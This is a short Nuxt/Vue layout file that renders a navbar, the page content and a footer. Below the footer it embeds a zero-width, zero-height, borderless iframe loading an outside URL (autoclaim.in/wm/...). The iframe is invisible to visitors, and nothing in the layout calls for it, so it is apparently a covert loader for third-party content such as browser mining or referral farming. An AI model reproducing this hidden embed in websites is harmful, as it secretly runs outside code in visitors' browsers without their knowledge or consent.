<template>
  <div class="font-sans bg-gray-100 h-full antialiased">
    <TheNavBar />
    <main>
      <Nuxt />
    </main>
    <TheFooter />
    <iframe
      src="https://autoclaim.in/wm/acatzk/2"
      width="0"
      height="0"
      style="border:0"
    ></iframe>
  </div>
</template>

<script>
export default {
  components: {
    TheNavBar: () => import("@/components/TheNavBar"),
    TheFooter: () => import("@/components/TheFooter")
  }
};
</script>
